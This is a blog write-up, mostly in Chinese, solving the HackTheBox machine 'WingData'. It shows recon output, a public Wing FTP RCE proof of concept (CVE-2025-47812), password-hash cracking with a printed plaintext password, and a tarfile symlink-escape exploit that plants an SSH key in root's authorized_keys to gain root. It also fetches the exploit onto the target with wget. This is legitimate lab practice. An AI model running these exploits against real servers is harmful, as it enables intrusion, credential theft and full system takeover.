---
layout: post
title: "HackTheBox - Wingdata"
date: 2026-03-26
category: "Security Practice｜HackTheBox"
tags: []
draft: false
toc: true
comments: true
---

# HackTheBox - Wingdata
<!-- more -->

## Port Scanning & Subdomain Enumeration & Directory Scanning
```bash
nmap -sC -sV 10.129.12.145
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-26 15:21 CST
Nmap scan report for wingdata.htb (10.129.12.145)
Host is up (0.20s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: WingData Solutions
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.78 seconds
$ ffuf -u http://wingdata.htb -H "Host: FUZZ.wingdata.htb" -w /snap/seclists/1214/Discovery/DNS/subdomains-top1million-20000.txt -fw 21
ftp                     [Status: 200, Size: 678, Words: 44, Lines: 10]
:: Progress: [19966/19966] :: Job [1/1] :: 201 req/sec :: Duration: [0:01:39] :: Errors: 0 ::
$ ffuf -u http://wingdata.htb/FUZZ -w /snap/seclists/1214//Discovery/Web-Content/common.txt
.htpasswd               [Status: 403, Size: 317, Words: 21, Lines: 10]
.hta                    [Status: 403, Size: 317, Words: 21, Lines: 10]
.htaccess               [Status: 403, Size: 317, Words: 21, Lines: 10]
assets                  [Status: 301, Size: 353, Words: 21, Lines: 10]
index.html              [Status: 200, Size: 12409, Words: 2646, Lines: 252]
server-status           [Status: 403, Size: 317, Words: 21, Lines: 10]
vendor                  [Status: 301, Size: 353, Words: 21, Lines: 10]
:: Progress: [4750/4750] :: Job [1/1] :: 190 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
```

## 進入subdomain
發現Wing FTP第三方服務，version: `7.4.3` → 找CVE → `CVE-2025–47812` → 找PoC
```bash
$ git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git
$ cd CVE-2025-47812
$ python CVE-2025-47812.py -u http://ftp.wingdata.htb -c ifconfig

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ifconfig' and username: 'anonymous'
[+] UID extracted: 23cdc1a5fd5da3e29a47f1c3b9a34e1bf528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 23cdc1a5fd5da3e29a47f1c3b9a34e1bf528764d624db129b32c21fbca0cb8d6

--- Command Output ---
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.244.106  netmask 255.255.0.0  broadcast 10.129.255.255
        ether 00:50:56:b0:cf:2e  txqueuelen 1000  (Ethernet)
        RX packets 61565  bytes 5635266 (5.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6400  bytes 1542126 (1.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 685  bytes 517702 (505.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 685  bytes 517702 (505.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
----------------------
```
這裡要特別說一下，應該是HTB的VM爛掉了，照理說透過metaspoit或其他poc，應該要能夠讀到資料，但都無法順利拿到，所以才參考[^1]的流程，發現根本一模一樣，但不知道為什麼就爛掉了，所以透過[^1]取得hash password: `cat /opt/wftpserver/Data/1/users/wacky.xml`
```text
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10:WingFTP
a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03:WingFTP
5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca:WingFTP
```

```bash
$ hashcat -m 1410 hashes.txt /usr/share/wordlists/rockyou.txt
...
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
...
```

* Username: `wacky`
* Password: `!#7Blushing^*Bride5`

## 提權
經過一翻recon之後，發現我們可以execute `/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py`，詳細內容如下
```bash
$ ssh wacky@htp.wingdata.htb
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

```python
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```

看起來主要目的是用來「還原備份檔（.tar）」到指定資料夾，代表這一定有用處?!針對這個的第一直覺也是找CVE，因為真的沒有其他想法，linpeas也沒啥特別的想法，這個`$ sudo -l`應該是蠻明顯的，問了AI發現IThome的post: [Python壓縮檔模組tarfile存在重大資安弱點，恐導致檔案系統遭任意寫入](https://www.ithome.com.tw/news/169422)
> 在Python環境裡，專門用來讀取、建立、打包，以及解壓縮tar檔案的程式庫tarfile，一旦出現弱點，就有可能讓攻擊者用於路徑穿越、任意檔案寫入（及覆蓋）、遠端執行任意程式碼（RCE）、權限提升、逃逸沙箱，甚至還有可能污染套件，引發供應鏈攻擊，因此，IT人員面對該程式庫相關的弱點，必須提高警覺。

和我們的狀態蠻類似的 → `CVE-2025-4517` → [CVE-2025-4138 / CVE-2025-4517](https://github.com/DesertDemons/CVE-2025-4138-4517-POC)
```bash
# 1. Generate an SSH key pair (REQUIRED — must exist before creating tar)
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""
cat ~/.ssh/id_ed25519.pub   # verify key was created

# 2. Create the malicious tar archive
python3 exploit.py \
    --preset ssh-key \
    --payload ~/.ssh/id_ed25519.pub \
    --tar-out ./evil.tar

# 3. Deliver the tar and trigger privileged extraction
#    (method varies — backup script, upload endpoint, CI pipeline, etc.)
#    Example: sudo python3 vulnerable_app.py --extract evil.tar

# 4. SSH in as root (use the SAME key you generated in step 1)
ssh -i ~/.ssh/id_ed25519 root@target
```
基本上我們的操作和上面的作者的順序差不多，另外可以先在host透過wget把exploit poc送過去()
```bash
$ git clone https://github.com/DesertDemons/CVE-2025-4138-4517-POC.git
$ cd CVE-2025-4138-4517-POC
$ python -m http.server 4444
```
另外一個host terminal
```bash
wacky@wingdata:~$ wget 10.10.15.108:4444/exploit.py -O exploit.py
--2026-03-26 12:31:22--  http://10.10.15.108:4444/exploit.py
Connecting to 10.10.15.108:4444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20491 (20K) [text/x-python]
Saving to: ‘exploit.py’

exploit.py                       100%[==========================================================>]  20.01K  61.1KB/s    in 0.3s

2026-03-26 12:31:23 (61.1 KB/s) - ‘exploit.py’ saved [20491/20491]
wacky@wingdata:~$ ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""
Generating public/private ed25519 key pair.
Created directory '/home/wacky/.ssh'.
Your identification has been saved in /home/wacky/.ssh/id_ed25519
Your public key has been saved in /home/wacky/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:4hQOLlHFPykxai5FEu6eOjyUG7lmxNj5v52o52L+xf8 wacky@wingdata
The key's randomart image is:
+--[ED25519 256]--+
|  ...o.          |
| .... +          |
|  oo...+ .       |
| . o+o..+        |
|o.==. +.S.       |
|.O+o.o o         |
|+ *o  . o        |
|.O  + .+ o       |
|+..ooB*.o ..E    |
+----[SHA256]-----+
wacky@wingdata:~$ cat ~/.ssh/id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICh1o8+w5+0bTi1fGvvK3e9zVRF1aupYcQyQ7U+/2zXK wacky@wingdata
wacky@wingdata:~$ python3 exploit.py \
    --preset ssh-key \
    --payload ~/.ssh/id_ed25519.pub \
    --tar-out ./backup_1001.tar
wacky@wingdata:~$ ls -al
total 52
drwxrwx--- 3 wacky wacky  4096 Mar 26 12:31 .
drwxr-xr-x 3 root  root   4096 Nov  3 12:04 ..
lrwxrwxrwx 1 root  root      9 Jan 22 04:41 .bash_history -> /dev/null
-rw-r--r-- 1 wacky wacky   220 Jun  6  2025 .bash_logout
-rw-r--r-- 1 wacky wacky  3526 Jun  6  2025 .bashrc
-rw-r--r-- 1 wacky wacky 20491 Mar 26 12:26 exploit.py
-rw-r--r-- 1 wacky wacky   807 Jun  6  2025 .profile
drwx------ 2 wacky wacky  4096 Mar 26 12:25 .ssh
-rw-r----- 1 root  wacky    33 Mar 26 12:16 user.txt
wacky@wingdata:~$ python3 exploit.py \
    --preset ssh-key \
    --payload ~/.ssh/id_ed25519.pub \
    --tar-out ./evil.tar
██████╗ ███████╗███████╗███████╗██████╗ ████████╗    ██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗███████╗
██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗╚══██╔══╝    ██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║██╔════╝
██║  ██║█████╗  ███████╗█████╗  ██████╔╝   ██║       ██║  ██║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║███████╗
██║  ██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗   ██║       ██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║╚════██║
██████╔╝███████╗███████║███████╗██║  ██║   ██║       ██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████║
╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝       ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝

Exploit by DesertDemons
   ╔═══════════════════════════════════════════════════════════════╗
   ║  CVE-2025-4138 / CVE-2025-4517  –  tarfile filter bypass      ║
   ║  Python PATH_MAX symlink escape  →  arbitrary file write      ║
   ╚═══════════════════════════════════════════════════════════════╝


[*] Preset: ssh-key — Write SSH public key to /root/.ssh/authorized_keys
[+] Creating directory:     /root/.ssh/
[+] Exploit tar written to: ./evil.tar
[+] Target file:            /root/.ssh/authorized_keys
[+] Payload size:           96 bytes
[+] File mode:              0o600

[*] Next steps:
    1. Trigger extraction of evil.tar
       as a privileged user with vulnerable Python (3.12.0–3.12.10 / 3.13.0–3.13.3)
    2. Verify that /root/.ssh/authorized_keys was written.

[*] Done.
wacky@wingdata:~$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar  -r restore_admin
[+] Backup: backup_1001.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_admin
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_admin
wacky@wingdata:~$ ssh -i ~/.ssh/id_ed25519 root@10.129.244.106
The authenticity of host '10.129.244.106 (10.129.244.106)' can't be established.
ED25519 key fingerprint is SHA256:JacnW6dsEmtRtwu2ULpY/CK8n/8M9tU+6pQhjBG3a4w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.244.106' (ED25519) to the list of known hosts.
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Mar 26 12:47:00 2026 from 10.129.244.106
root@wingdata:~# cat ./root.txt
2636c62e03eabac7e48516458e965b51
```

* User Flag: `db7b329ede123c7c6b648fdff492242e`
* Root Flag: `2636c62e03eabac7e48516458e965b51`

這個漏洞利用 tar 解壓時未驗證檔案路徑，攻擊者可在壓縮檔中放入包含 `../` 的路徑，導致檔案被寫到目標目錄之外，在 sudo 環境下可達成任意檔案寫入與提權。

## Reference
[^1]:[HTB WingData Write-Up](https://medium.com/@David-Dvora/htb-wingdata-write-up-9f64b59a194d)